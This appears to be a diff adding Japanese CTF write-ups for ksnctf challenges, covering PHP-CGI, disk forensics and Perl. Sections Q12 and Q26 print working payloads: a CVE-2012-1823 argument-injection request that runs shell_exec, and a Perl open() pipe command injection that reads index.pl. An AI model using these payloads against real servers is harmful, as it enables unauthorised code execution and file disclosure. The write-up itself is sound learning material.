@@ -143,6 +143,52 @@ Unix系システムにおいて、ファイルに書かれたプログラム文�
 
 ---
 
+## Q12 「Hypertext Preprocessor」
+
+![ksnctf-q12.png](ksnctf-q12.png)
+
+Hypertext Preprocessor → php ということで、php の脆弱性に由来するものかなと予想。
+
+リンクを開いてみると時刻が赤字で表示されているだけでした。
+
+ここで悩んでいると、CTF友達 I が横から乱入してきました。
+
+「このサイトが参考になる」ということで、下記のサイトを紹介されました。
+
+[CGI版PHPにリモートからスクリプト実行を許す脆弱性(CVE-2012-1823)](https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html)
+
+徳丸さんの日記で、CGI版PHPのスクリプト実行の脆弱性について紹介されていました。
+
+一応、[CGIとは](https://e-words.jp/w/CGI.html)
+
+なるほど、これを使えば良いのかということで、
+
+BurpSuiteを起動！Repeaterを起動！
+
+GET から POST に変更して、
+
+URL 
+```
+/q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input
+```
+Content
+```
+<?php echo shell_exec('cat index.php'); ?>
+```
+
+「Flag is in this directory.」ということのようなので ls を使ってみましょう。
+
+Content
+```
+<?php echo shell_exec('ls'); ?>
+```
+
+それらしきファイルがあり、フラグを得ることができました。
+
+徳丸さんに感謝。
+
+---
+
 ## Q13 「Proverb」
 
 ![ksnctf-q13.png](ksnctf-q13.png)
@@ -265,6 +311,82 @@ time.sleep(0.05)を入れると二分探索の偉大さがよくわかりまし�
 
 ---
 
+## Q18 「USB flash drive」
+
+![ksnctf-q18.png](ksnctf-q18.png)
+
+Flagを探せと、drive.zip を解凍してみたら、imgファイルを得ることができました。
+
+imgファイルの中身は3つのjpgファイル。
+
+画像も特に違和感なく、バイナリも見ましたが普通の JFIF で始まるjpgファイルでした。 
+
+ここで止まってしまいました。
+
+writeupによるとimgファイルの解析を行う必要があるようです。
+
+[The Sleuth Kit](https://www.sleuthkit.org/sleuthkit/)をインストールして解析してみました。
+
+`fls drive.img` でdrive.img内を見ることができるようです。
+
+結果
+```
+r/r 4-128-4:	$AttrDef
+r/r 8-128-2:	$BadClus
+r/r 8-128-1:	$BadClus:$Bad
+r/r 6-128-4:	$Bitmap
+r/r 7-128-1:	$Boot
+d/d 11-144-4:	$Extend
+r/r 2-128-1:	$LogFile
+r/r 0-128-1:	$MFT
+r/r 1-128-1:	$MFTMirr
+r/r 9-128-8:	$Secure:$SDS
+r/r 9-144-11:	$Secure:$SDH
+r/r 9-144-5:	$Secure:$SII
+r/r 10-128-1:	$UpCase
+r/r 3-128-3:	$Volume
+r/r 35-128-1:	Carl Larsson Brita as Iduna.jpg
+r/r 37-128-1:	Mona Lisa.jpg
+r/r 38-128-1:	The Great Wave off Kanagawa.jpg
+-/r * 36-128-1:	Liberty Leading the People.jpg
+-/r * 36-128-4:	Liberty Leading the People.jpg:00
+-/r * 36-128-5:	Liberty Leading the People.jpg:01
+-/r * 36-128-6:	Liberty Leading the People.jpg:02
+-/r * 36-128-7:	Liberty Leading the People.jpg:03
+-/r * 36-128-8:	Liberty Leading the People.jpg:04
+-/r * 36-128-9:	Liberty Leading the People.jpg:05
+-/r * 36-128-10:	Liberty Leading the People.jpg:06
+V/V 256:	$OrphanFiles
+```
+
+先程見た画像ファイル3つの他にもう一つファイルが有るようです。
+
+見てみましょう。
+
+```
+icat drive.img 36 > 36.jpg
+```
+
+画像内には、「The flag is in this file , but not in this image. 」 と書いてありました。
+
+ということでバイナリを見てみましたが、FLAGはありません。
+
+結果的には、36-128-1 ~ 36-128-10 と分かれていることに目をつけて、icat で1つずつ出力することでFLAGを得ることができました。
+
+下記コマンドを10まで行ってみる。
+
+```
+icat drive.img 36-128-4
+```
+
+今回は全く歯が立ちませんでした。
+
+下記が参考にしたサイトです。ありがとうございました。
+
+[ksnctf #18 USB flash drive](https://qiita.com/NakashimaKenta/items/238395dadf08eade3c60)
+
+---
+
 ## Q20 「G00913」
 
 ![ksnctf-q20.png](ksnctf-q20.png)
@@ -276,6 +398,10 @@ ChatGPTに代わりに探して貰いました。
 あんまり、LLMは使わないほうがいいのかな？
 
 この問題の性質的に使ってもいいかなと思い使いました。
+
+※2024/06/01 追記
+→ 使わずに円周率をある程度の長さ出力してもらって、
+　 1文字ずつずらして素数判定すればよかったなと思った。
 
 ---
 
@@ -324,6 +450,67 @@ length , print , else ... と読める文字が多いので暗号化はされて
 余談ですが、[paiza.io](https://paiza.io/ja/projects/new)かなり便利ですよね。
 
 paizaさんいつもありがとうございます。
+
+---
+
+## Q26 「Sherlock Holmes」
+
+![ksnctf-q26.png](ksnctf-q26.png)
+
+シャーロック・ホームズか
+
+まず、気になったのは「index.pl」です。
+
+Perl で書かれているということで、Perl の脆弱性とか変わってくるのかな。
+
+「index.pl」を開いたら、テキストファイルのリンクが3つと参照元のリンクが一つ。
+
+すべてソースまで確認したが怪しいところはない。
+
+では、「q26」フォルダ見れるか試してみようということで、
+```path
+https://ctfq.u1tramarine.blue/q26/
+```
+
+見ることができました。
+
+![[ksnctf-q26-1.png]]
+
+「flag.txt」だ。勝ったな。と思い開いてみますが、
+
+```
+FROG_CroakCroak
+
+How about to try to see the source code?
+```
+
+フラグっぽい文字とソースコードを見てみろという指示がありました。
+
+ソースコードはあらかた見ていて怪しいところはありませんでした。
+
+「cracked.txt」もソースは空。
+
+ここで止まってしまいました。
+
+Perl の脆弱性とかなんかなと思っていましたが、やはりそのようです。
+
+[安全なウェブサイトの作り方 - 1.2 OSコマンド・インジェクション](https://www.ipa.go.jp/security/vuln/websecurity/os-command.html)
+
+上記のサイトに書いてありました。
+
+「外部プログラムを呼び出し可能な関数の例：Perl： open(), system(), eval() 等」　
+
+「Perlのopen関数は、引数として与えるファイルパスに「|」（パイプ）を使うことでOSコマンドを実行できる」
+
+ということで、早速、OSコマンドインジェクションを試してみます。
+
+```
+https://ctfq.u1tramarine.blue/q26/index.pl/ | cat index.pl
+```
+
+Flagを得ることができました。
+
+しっかり、open関数を使っていますね。
 
 ---
 
